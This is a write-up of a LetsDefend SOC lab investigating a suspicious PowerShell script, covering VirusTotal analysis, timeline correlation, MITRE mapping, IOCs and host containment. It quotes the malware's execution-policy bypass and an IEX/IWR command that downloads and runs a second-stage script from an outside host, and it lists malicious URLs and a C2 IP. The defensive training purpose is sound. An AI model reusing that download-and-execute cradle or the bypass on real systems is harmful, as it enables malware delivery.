# SOC153 – Suspicious PowerShell Script Executed

## 📌 Lab Information

| Field | Details |
|---|---|
| Platform | LetsDefend |
| Lab ID | SOC153 |
| Alert | Suspicious PowerShell Script Executed |
| Severity | Medium |
| Alert Type | Malware |
| Difficulty | Medium |
| Host | Tony |
| Host IP | `172.16.17.206` |
| Operating System | Windows 10 |
| Result | **True Positive** |
| Playbook Score | **15 / 15** |
| Success Rate | **100%** |

---

# 🎯 Scenario

A security alert was generated after a suspicious PowerShell script was executed on the Windows endpoint **Tony**.

The investigation focused on determining:

- Whether the PowerShell script was malicious
- How the script reached the endpoint
- How it was executed
- What additional activity it performed
- Whether the endpoint communicated with a malicious infrastructure
- Whether containment was required

---

# 🚨 Alert Information

**Alert:** `SOC153 - Suspicious Powershell Script Executed`

**Event ID:** `238`

**Event Time:**

```text
2024-03-14 17:23:43
```

**Hostname:**

```text
Tony
```

**IP Address:**

```text
172.16.17.206
```

**File Name:**

```text
payload_1.ps1
```

**File Path:**

```text
C:\Users\LetsDefend\Downloads\payload_1.ps1
```

**SHA-256:**

```text
db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0
```

**AV/EDR Action:**

```text
Detected
```

---

# 🔎 Investigation Process

## 1. Initial Alert Review

The alert indicated that a suspicious PowerShell script named `payload_1.ps1` had been executed on the endpoint **Tony**.

The script was located in the user's Downloads directory.

The SHA-256 hash was collected for further threat intelligence investigation.

---

## 2. VirusTotal Investigation

The SHA-256 hash was searched in VirusTotal.

### VirusTotal Results

- Detection: **34 / 61 security vendors**
- File type: PowerShell
- Threat label: `trojan.powershell/boxter`
- Categories:
  - Trojan
  - Downloader
  - Dropper
- Family labels included:
  - PowerShell
  - Boxter
  - Azorult

VirusTotal also showed behavioral tags including:

```text
powershell
long-sleeps
exe-pattern
detect-debug-environment
checks-network-adapters
url-pattern
```

This established that the file had a strong malicious reputation.

---

## 3. VirusTotal Network Indicators

VirusTotal analysis showed several network indicators associated with the sample.

An important IP address was:

```text
161.22.46.148
```

VirusTotal also showed the following URL:

```text
https://kionagranada.com/upload/beauty.exe
```

These indicators were used for further investigation against the endpoint's network logs.

---

## 4. Endpoint Investigation

The affected endpoint was:

| Field | Value |
|---|---|
| Hostname | Tony |
| IP Address | `172.16.17.206` |
| OS | Windows 10 |
| Domain | LetsDefend |
| Primary User | LetsDefend |
| Client/Server | Server |

The endpoint was initially not contained.

---

## 5. Browser History Investigation

Browser history showed that the endpoint accessed:

```text
https://files.ld.s3.us-east-2.amazonaws.com/payload_1.ps1
```

at:

```text
2024-03-14 17:22:25
```

The suspicious PowerShell alert occurred at:

```text
2024-03-14 17:23:43
```

This created the following initial timeline:

```text
17:22:25
    ↓
payload_1.ps1 downloaded
    ↓
17:23:43
    ↓
Suspicious PowerShell Script Executed alert
```

This strongly correlated the downloaded script with the alert.

---

## 6. Process Investigation

Endpoint telemetry showed the execution of:

```text
powershell.exe
```

Process path:

```text
C:\Windows\System32\WINDOWSPOWERSHELL\v1.0\powershell.exe
```

Parent process:

```text
explorer.exe
```

The process referenced:

```text
payload_1.ps1
```

The process event occurred around:

```text
2024-03-14 19:53:27
```

---

## 7. Execution Policy Bypass

The PowerShell command line contained:

```powershell
if((Get-ExecutionPolicy) -ne 'AllSigned'){
Set-ExecutionPolicy -Scope Process Bypass
};
& 'C:\Users\LetsDefend\Downloads\payload_1.ps1'
```

Two important behaviors were identified.

### Execution Policy Bypass

```powershell
Set-ExecutionPolicy -Scope Process Bypass
```

This configured the PowerShell process to bypass the normal execution policy.

### Script Execution

```powershell
& 'C:\Users\LetsDefend\Downloads\payload_1.ps1'
```

The downloaded `payload_1.ps1` script was explicitly executed.

---

## 8. PowerShell Script Block Logging

PowerShell Script Block Logging **Event ID 4104** provided additional evidence.

The recorded script block contained:

```text
"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"
```

This revealed a second-stage download and execution mechanism.

### Invoke-WebRequest

`IWR` is the PowerShell alias for:

```text
Invoke-WebRequest
```

It was used to request:

```text
https://kionagranada.com/upload/sd2.ps1
```

### Invoke-Expression

`IEX` is the PowerShell alias for:

```text
Invoke-Expression
```

The downloaded content was then passed to PowerShell for execution.

The observed behavior can therefore be summarized as:

```text
PowerShell
    ↓
Invoke-WebRequest
    ↓
Download sd2.ps1
    ↓
Invoke-Expression
    ↓
Execute downloaded content
```

---

## 9. Network Investigation

Log Management was searched using the affected endpoint:

```text
172.16.17.206
```

A relevant network event was identified:

| Field | Value |
|---|---|
| Source | `172.16.17.206` |
| Destination | `161.22.46.148` |
| Destination Port | `443` |
| Time | `2024-03-14 19:53:47` |

The destination IP:

```text
161.22.46.148
```

was also observed by VirusTotal during analysis of the same sample.

---

# ⏱️ Timeline Correlation

The investigation produced the following timeline:

```text
2024-03-14 17:22:25
        │
        ├── Browser downloads payload_1.ps1
        │
        ▼
2024-03-14 17:23:43
        │
        ├── SOC153 alert generated
        │
        ▼
2024-03-14 19:53:27
        │
        ├── PowerShell process created
        ├── payload_1.ps1 executed
        ├── ExecutionPolicy Bypass
        │
        └── Event ID 4104
                │
                ├── IWR
                │     ↓
                │   sd2.ps1
                │
                └── IEX
                      ↓
                  Execute content
        │
        ▼
2024-03-14 19:53:47
        │
        └── 172.16.17.206
                ↓
          161.22.46.148:443
```

The network connection occurred approximately **20 seconds after** the PowerShell process/script activity.

---

# 🧩 MITRE ATT&CK

The LetsDefend alert was mapped to the following MITRE ATT&CK techniques:

| Technique | ID |
|---|---|
| Drive-by Compromise | `T1189` |
| Command and Scripting Interpreter: PowerShell | `T1059.001` |
| User Execution: Malicious File | `T1204.002` |
| Application Layer Protocol | `T1071` |

The investigation provided direct evidence of PowerShell execution and application-layer network communication.

---

# 🌐 Indicators of Compromise

## File

| Type | Value |
|---|---|
| Filename | `payload_1.ps1` |
| SHA-256 | `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0` |

## IP Address

```text
161.22.46.148
```

## URL

```text
https://kionagranada.com/upload/sd2.ps1
```

Additional URL observed during VirusTotal analysis:

```text
https://kionagranada.com/upload/beauty.exe
```

---

# 🛡️ Containment

The affected host was identified as:

```text
Tony
172.16.17.206
```

The endpoint was subsequently contained through the Endpoint Security interface.

Final endpoint status:

```text
Host Contained
```

---

# 📝 Analyst Assessment

The investigation determined that the alert represented genuine malicious activity.

Evidence included:

- VirusTotal detected the sample as malicious.
- The suspicious script was downloaded to the endpoint.
- `payload_1.ps1` was executed using PowerShell.
- PowerShell used an ExecutionPolicy Bypass.
- Event ID 4104 revealed a second-stage PowerShell download.
- `IWR` was used to retrieve `sd2.ps1`.
- `IEX` was used to execute the retrieved content.
- The endpoint communicated with `161.22.46.148:443`.
- The IP was observed by VirusTotal for the analyzed sample.
- The endpoint was successfully contained.

The malware was **not observed as quarantined or cleaned** during the investigation.

---

# 🎓 Lessons Learned

This investigation reinforced several important SOC concepts:

### 1. Don't rely on the alert alone

The initial alert only identified suspicious PowerShell execution.

Additional telemetry was required to understand the activity.

### 2. Threat intelligence needs endpoint validation

VirusTotal provided useful IP and URL indicators, but the endpoint's own logs were required to determine whether the host actually communicated with one of those indicators.

### 3. PowerShell Script Block Logging is valuable

Event ID `4104` exposed the actual PowerShell commands being executed and revealed the second-stage download.

### 4. Timeline correlation matters

Correlating:

```text
Browser
   ↓
Process
   ↓
PowerShell
   ↓
Script Block
   ↓
Network
```

provided much stronger evidence than investigating each event independently.

### 5. ExecutionPolicy Bypass is an important signal

The use of:

```powershell
Set-ExecutionPolicy -Scope Process Bypass
```

is an important indicator that should receive additional investigation when seen alongside suspicious script execution.

---

# 🧠 Skills Practiced

- SOC Alert Triage
- Malware Investigation
- VirusTotal Analysis
- Threat Intelligence
- Windows Endpoint Investigation
- PowerShell Investigation
- PowerShell Script Block Logging
- Process Investigation
- Network Log Analysis
- IOC Correlation
- Timeline Analysis
- MITRE ATT&CK Mapping
- Incident Containment
- Incident Response
- Analyst Documentation

---

# 🔄 SOC Investigation Workflow

```text
Alert Triage
     ↓
Identify Host & File
     ↓
Hash Investigation
     ↓
VirusTotal Analysis
     ↓
Endpoint Investigation
     ↓
Browser History
     ↓
Process Investigation
     ↓
PowerShell Command Analysis
     ↓
Event ID 4104 Analysis
     ↓
Network Investigation
     ↓
IOC Correlation
     ↓
Timeline Correlation
     ↓
Containment
     ↓
Final Verdict
```

---

# 🚨 Final Verdict

## TRUE POSITIVE

The SOC153 alert was confirmed as a **True Positive**.

The investigation established malicious PowerShell execution, second-stage script retrieval and execution, and related network activity.

The affected endpoint was contained to prevent further activity.

---

# 🏆 LetsDefend Playbook Result

| Playbook Item | Result |
|---|---|
| Threat Indicator | Unknown/unexpected outgoing internet traffic |
| Malware Quarantined/Cleaned | Not Quarantined |
| Analyze Malware | Malicious |
| C2 Address Accessed | Accessed |
| Host Containment | Completed |
| Final Result | **True Positive** |
| Playbook Score | **15** |
| Success Rate | **100%** |

---

# 📌 Lab Status

**Completed ✅**

**SOC153 – Suspicious PowerShell Script Executed**

**Result: True Positive**

**Playbook: 15/15 – 100%**